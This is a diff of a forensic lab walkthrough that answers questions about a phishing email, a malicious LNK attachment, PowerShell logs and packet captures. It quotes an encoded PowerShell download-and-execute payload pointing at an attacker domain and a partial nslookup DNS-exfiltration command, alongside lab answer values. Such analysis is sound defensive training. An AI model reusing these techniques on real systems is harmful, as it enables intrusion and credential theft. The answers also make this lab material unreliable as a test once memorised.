@@ -26,9 +26,10 @@ After started the machine, we can confirm all of our evidences on the `artefacts
 
 To make life easier when analyze email header, I copied content from `dump.eml` to [MX Toolbox - Email Header Analyzer](https://mxtoolbox.com/Public/Tools/EmailHeaders.aspx?huid=a8dc53e9-48eb-40ec-ac89-3ab4702f8bb1) to highlight each header in table and automatically validates various information such as SPF, DKIM, DMARC for us which we can see that all "From", "Reply-To" and "Return-Path" are the same which mean its less likely that this sender email was spoofing. 
 
-```
-agriffin@bpakcaging.xyz
-```
+<details>
+  <summary>Answer</summary>
+<pre><code>agriffin@bpakcaging.xyz</code></pre>
+</details>
 
 >What is the email address of the victim?
 
@@ -36,9 +37,10 @@ agriffin@bpakcaging.xyz
 
 We can get the answer from "To" header right here.
 
-```
-julianne.westcott@hotmail.com
-```
+<details>
+  <summary>Answer</summary>
+<pre><code>julianne.westcott@hotmail.com</code></pre>
+</details>
 
 >What is the name of the third-party mail relay service used by the attacker based on the **DKIM-Signature** and **List-Unsubscribe** headers?
 
@@ -54,9 +56,10 @@ Which we could also find the same domain from "List-Unsubscribe" as well.
 
 By a quick google search, we can see that this domain is belong to Elastic Email which is the third-party mail relay service that we are hunting for.
 
-```
-elasticemail
-```
+<details>
+  <summary>Answer</summary>
+<pre><code>elasticemail</code></pre>
+</details>
 
 >What is the name of the file inside the encrypted attachment?
 
@@ -72,14 +75,17 @@ And it was encrypted with password so this practice could make email provider an
 
 We can copy base64 string to bash shell and decode it which we could use the password found in the email body to extract the content of this file out and then we will have the malicious attachment as the final file attachment and its the answer of this question as well.
 
-```
-Invoice_20230103.lnk
-```
+<details>
+  <summary>Answer</summary>
+<pre><code>Invoice_20230103.lnk</code></pre>
+</details>
 
 >What is the password of the encrypted attachment?
-```
-Invoice2023!
-```
+
+<details>
+  <summary>Answer</summary>
+<pre><code>Invoice2023!</code></pre>
+</details>
 
 >Based on the result of the lnkparse tool, what is the encoded payload found in the Command Line Arguments field?
 
@@ -91,9 +97,10 @@ We can use the following command to extract various infomation stores inside the
 
 We can now decode it to see what it will end up executing and the result shown that it will fetch content from C2 and execute it.
 
-```
-aQBlAHgAIAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABuAGUAdAAuAHcAZQBiAGMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AZgBpAGwAZQBzAC4AYgBwAGEAawBjAGEAZwBpAG4AZwAuAHgAeQB6AC8AdQBwAGQAYQB0AGUAJwApAA==
-```
+<details>
+  <summary>Answer</summary>
+<pre><code>aQBlAHgAIAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABuAGUAdAAuAHcAZQBiAGMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AZgBpAGwAZQBzAC4AYgBwAGEAawBjAGEAZwBpAG4AZwAuAHgAeQB6AC8AdQBwAGQAYQB0AGUAJwApAA==</code></pre>
+</details>
 
 ***
 ## [Endpoint Security] Are you sure that’s an invoice?
@@ -114,9 +121,10 @@ With the following discoveries, we should now proceed with analysing the PowerSh
 
 Its time to look into PowerShell log which we can use `cat powershell.json | jq | grep xyz` command to filter event with the domain we found from the attachment which we can see that there are 2 subdomain that was used to host files, the first domain is `files.bpakcaging.xyz` and the other one is `cdn.bpakcaging.xyz` and the latter is the C2 domain that used to send and receive result from the attacker so we can assume that the PowerShell command from `/update` endpoint is resulting with C2 connection.
 
-```
-cdn.bpakcaging.xyz,files.bpakcaging.xyz
-```
+<details>
+  <summary>Answer</summary>
+<pre><code>cdn.bpakcaging.xyz,files.bpakcaging.xyz</code></pre>
+</details>
 
 >What is the name of the enumeration tool downloaded by the attacker?
 
@@ -128,9 +136,10 @@ We can filter for the line with only "ScriptBlockText" field only with `cat powe
 
 And then we could also find that the attacker also got the compiled executable of SeatBelt to execute which we could also see that the previous `sb.exe` that was downloaded might actually be the SeatBelt compiled executable of SeatBelt itself from the command line argument.
 
-```
-seatbelt
-```
+<details>
+  <summary>Answer</summary>
+<pre><code>seatbelt</code></pre>
+</details>
 
 >What is the file accessed by the attacker using the downloaded sq3.exe binary? Provide the full file path with escaped backslashes.
 
@@ -141,16 +150,19 @@ We could dig deeper and find the current path of the attacker while running `sql
 Read more about Windows Sticky Notes Forensics from the following Medium writer here:
 - https://dingtoffee.medium.com/windows-sticky-notes-forensics-80ee31ab67ef
 
-```
-C:\\Users\\j.westcott\\AppData\\Local\\Packages\\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\\LocalState\\plum.sqlite
-```
+<details>
+  <summary>Answer</summary>
+<pre><code>C:\\Users\\j.westcott\\AppData\\Local\\Packages\\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\\LocalState\\plum.sqlite</code></pre>
+</details>
 
 >What is the software that uses the file in Q3?
 
 ![766fc4d787053053511f98fee7621f27.png](/resources/766fc4d787053053511f98fee7621f27.png)
-```
-Microsoft Sticky Notes
-```
+
+<details>
+  <summary>Answer</summary>
+<pre><code>Microsoft Sticky Notes</code></pre>
+</details>
 
 >What is the name of the exfiltrated file?
 
@@ -158,14 +170,17 @@ Microsoft Sticky Notes
 
 Then we can see that the attacker found the keepass database file which he then exfiltrated it to 167.71.211.113.
 
-```
-protected_data.kdbx
-```
+<details>
+  <summary>Answer</summary>
+<pre><code>protected_data.kdbx</code></pre>
+</details>
 
 >What type of file uses the .kdbx file extension?
-```
-keepass
-```
+
+<details>
+  <summary>Answer</summary>
+<pre><code>keepass</code></pre>
+</details>
 
 >What is the encoding used during the exfiltration attempt of the sensitive file?
 
@@ -180,14 +195,17 @@ $split = $hex -split '(\\S{50})'; ForEach ($line in $split) { nslookup -q=A \"$l
 
 Which we can see that the fille will be converted to hex, split it to 50 characters each then recursively use `nslookup` to make DNS type A query to the C2 domain we found by adding the hex that were spitted to subdomain.
 
-```
-hex
-```
+<details>
+  <summary>Answer</summary>
+<pre><code>hex</code></pre>
+</details>
 
 >What is the tool used for exfiltration?
-```
-nslookup
-```
+
+<details>
+  <summary>Answer</summary>
+<pre><code>nslookup</code></pre>
+</details>
 
 ***
 ## [Network Traffic Analysis] They got us. Call the bank immediately!
@@ -213,9 +231,10 @@ Its time to look at the network capture file, since we already found out that at
 
 Since we only want to know about the `files` subdomain so we could follow either 1 of those 3 files which we can see that these files were hosted via Python HTTP Server.
 
-```
-python
-```
+<details>
+  <summary>Answer</summary>
+<pre><code>python</code></pre>
+</details>
 
 >What HTTP method is used by the C2 for the output of the commands executed by the attacker?
 
@@ -231,9 +250,10 @@ By inspecting the contents of one of the files, we notice a sequence of numbers 
 
 These numbers can be decoded using a tool like CyberChef. Simply use the "From Decimal" operation to convert the decimal values back into readable ASCII characters.
 
-```
-POST
-```
+<details>
+  <summary>Answer</summary>
+<pre><code>POST</code></pre>
+</details>
 
 >What is the protocol used during the exfiltration activity?
 
@@ -245,9 +265,10 @@ We know from the previous section that the attacker then exfiltrated keepass dat
 
 Now we can focus on the file exfiltration via DNS query with `ip.dst == 167.71.211.113 && dns.qry.type == 1` filter which will help us extract them on the last question.
 
-```
-dns
-```
+<details>
+  <summary>Answer</summary>
+<pre><code>dns</code></pre>
+</details>
 
 >What is the password of the exfiltrated file?
 
@@ -267,9 +288,10 @@ Now we can proceed with `tshark -r capture.pcapng -Y 'http.content_type == "appl
 
 Then we will see that the attacker found master password of keepass database which we will use it to access keepass database on the next question!
 
-```
-%p9^3!lL^Mz47E2GaT^y
-```
+<details>
+  <summary>Answer</summary>
+<pre><code>%p9^3!lL^Mz47E2GaT^y</code></pre>
+</details>
 
 >What is the credit card number stored inside the exfiltrated file?
 
@@ -289,9 +311,10 @@ I copied the hex characters to HTB Pwnbox since it let me install tools and acce
 
 After inspecting each entries, we will have the Company Card inside `protected_data/Homebanking` as shown in the image above.
 
-```
-4024007128269551
-```
+<details>
+  <summary>Answer</summary>
+<pre><code>4024007128269551</code></pre>
+</details>
 
 ![21c0c32c335a8e0952b45a8aeec45b82.png](/resources/21c0c32c335a8e0952b45a8aeec45b82.png)
 
